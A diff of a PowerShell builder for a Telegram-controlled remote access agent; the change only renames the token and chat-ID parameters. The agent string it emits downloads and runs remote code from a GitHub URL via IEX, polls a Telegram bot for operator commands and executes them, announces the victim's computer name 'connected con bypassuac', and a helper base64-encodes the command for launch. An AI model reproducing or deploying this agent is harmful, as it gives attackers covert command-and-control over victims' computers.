@@ -15,8 +15,8 @@ BOT TELEGRAM:
 	#>
 	########################################################## Agent Bot Code ##########################################################
 
-function create_agent {param ($botkey,$chat_id)
-$agent_bot = '[string]$botkey = "your_token";[string]$bot_Master_ID = "your_chat_id";[int]$delay = "your_delay";IEX (Invoke-WebRequest "https://raw.githubusercontent.com/whobornin1980/bot/master/Functions.ps1").content;$chat_id = $bot_Master_ID;$getUpdatesLink = "https://api.telegram.org/bot$botkey/getUpdates";[int]$first_connect = "1";while($true) { $json = Invoke-WebRequest -Uri $getUpdatesLink -Body @{offset=$offset} | ConvertFrom-Json;$l = $json.result.length;$i = 0;if ($first_connect -eq 1) {$texto = "$env:COMPUTERNAME connected con bypassuac :D"; envia-mensaje -text $texto -chat $chat_id -botkey $botkey; $first_connect = $first_connect + 1};while ($i -lt $l) {$offset = $json.result[$i].update_id + 1; $comando = $json.result[$i].message.text;test-command -comando $comando -botkey $botkey -chat_id $chat_id -first_connect $first_connect;$i++} ;Start-Sleep -s $delay ;$first_connect++ }' ; $agent_bot = $agent_bot -replace "your_token", "$botkey" -replace "your_chat_id", "$chat_id" -replace "your_delay", "1" ; return $agent_bot}
+function create_agent {param ($BotToken,$ChatID)
+$agent_bot = '[string]$BotToken = "your_token";[string]$bot_Master_ID = "your_chat_id";[int]$delay = "your_delay";IEX (Invoke-WebRequest "https://raw.githubusercontent.com/whobornin1980/bot/master/Functions.ps1").content;$ChatID = $bot_Master_ID;$getUpdatesLink = "https://api.telegram.org/bot$BotToken/getUpdates";[int]$first_connect = "1";while($true) { $json = Invoke-WebRequest -Uri $getUpdatesLink -Body @{offset=$offset} | ConvertFrom-Json;$l = $json.result.length;$i = 0;if ($first_connect -eq 1) {$texto = "$env:COMPUTERNAME connected con bypassuac :D"; envia-mensaje -text $texto -chat $ChatID -botkey $BotToken; $first_connect = $first_connect + 1};while ($i -lt $l) {$offset = $json.result[$i].update_id + 1; $comando = $json.result[$i].message.text;test-command -comando $comando -botkey $BotToken -chat_id $ChatID -first_connect $first_connect;$i++} ;Start-Sleep -s $delay ;$first_connect++ }' ; $agent_bot = $agent_bot -replace "your_token", "$BotToken" -replace "your_chat_id", "$ChatID" -replace "your_delay", "1" ; return $agent_bot}
 
 function code_a_base64 {param ($code)
 $ms = New-Object IO.MemoryStream
@@ -36,7 +36,6 @@ $UnicodeEncoder = New-Object System.Text.UnicodeEncoding
 $codeScript = [Convert]::ToBase64String($UnicodeEncoder.GetBytes($command))
 return $codeScript
 }
-	
 	
 	
 	
